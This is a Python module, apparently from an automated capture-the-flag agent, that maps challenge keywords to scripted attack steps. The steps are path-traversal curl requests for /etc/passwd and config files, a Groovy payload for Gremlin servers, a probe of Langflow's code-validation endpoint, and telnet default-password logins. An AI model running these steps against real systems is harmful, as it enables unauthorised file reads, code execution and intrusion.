"""指纹级技能包：命中就给 3-5 条可执行动作 + 停止规则，不依赖题号/历史。"""

from __future__ import annotations

from playbooks import _base_for

SKILLS: list[dict] = [
    {
        "id": "web-source-lfi",
        "require": [("download.php", "?id=", "includes", "lfi", "源码", "文件包含")],
        "steps": [
            "curl -s '{base}/download.php?id=../../../../etc/passwd'",
            "curl -s '{base}/download.php?id=../includes/config.php'",
            "curl -s '{base}/download.php?id=../includes/auth.php'",
            "curl -s '{base}/download.php?id=../.htaccess'",
        ],
        "stop": "拿到源码后先 grep 路由/rewrite/approve/admin，再猜文件名；3 次不中即读 DirectoryIndex/000-default.conf。",
    },
    {
        "id": "gremlin-groovy",
        "require": [("gremlin", "hugegraph", "groovy", "tinkerpop")],
        "steps": [
            "curl -s -X POST '{base}/gremlin' -H 'Content-Type: application/json' -d '{\"gremlin\":\"g.V().limit(1)\"}'",
            "curl -s -i '{base}/gremlin'  # 先确认 auth/序列化要求",
            "Groovy: new String(Files.readAllBytes(Paths.get('/challenge/flag.txt')))",
            "Java classloading: Thread.currentThread().getContextClassLoader().getResourceAsStream(...)",
        ],
        "stop": "先确认查询语法/认证；一次 payload 失败就换编码（JSON/Groovy/Java），不要盲改括号。",
    },
    {
        "id": "logic-oracle",
        "require": [("bypass", "score", "check", "compare", "threshold", "校验", "阈值")],
        "steps": [
            "列出该端点的 3 种响应（成功/失败/异常），做成布尔 oracle",
            "对参数做边界/类型/编码矩阵：0/1/-1/空/超长/布尔/数组/对象",
            "对比成功阈值：return 1 vs return 0、<= vs <、score+1",
        ],
        "stop": "不要猜业务；先用 3 个输入确定 oracle 的判定条件，再构造刚好越界的值。",
    },
    {
        "id": "gradio-langflow",
        "require": [("gradio", "langflow", "7860")],
        "steps": [
            "curl -s -i '{base}/config'",
            "curl -s -i '{base}/api/v1/version'",
            "curl -s -i -X POST '{base}/api/v1/validate/code' -H 'Content-Type: application/json' -d '{\"code\":\"...\"}'",
            "source disclosure: 先读 /config 里的组件/flag 提示",
        ],
        "stop": "先 version → 已知 CVE → 精确 payload；一次失败检查 Content-Type/JSON 形状，再换 CVE。",
    },
    {
        "id": "telnet-interactive",
        "require": [("telnet", ":23", "远程登录")],
        "steps": [
            "nc -w3 {target}  # 读 banner，处理 IAC",
            "默认/弱口令 root:root / admin:admin",
            "登录后 cat /challenge/flag.txt /flag.txt",
        ],
        "stop": "2 组凭据失败即换；拿到 shell 先读 flag，不要继续交互。",
    },
]


def match(text: str) -> dict | None:
    low = text.lower()
    for skill in SKILLS:
        if all(any(keyword.lower() in low for keyword in group) for group in skill["require"]):
            return skill
    return None


def render(skill: dict, target: str = "") -> str:
    base = _base_for(target)
    steps = [
        step.replace("{base}", base).replace("{target}", target or "<target>")
        for step in skill["steps"]
    ]
    lines = [f"# SKILL: {skill['id']} (apply before inventing new paths)"]
    lines.extend(f"{index}. {step}" for index, step in enumerate(steps, 1))
    lines.append(f"STOP RULE: {skill['stop']}")
    return "\n".join(lines)
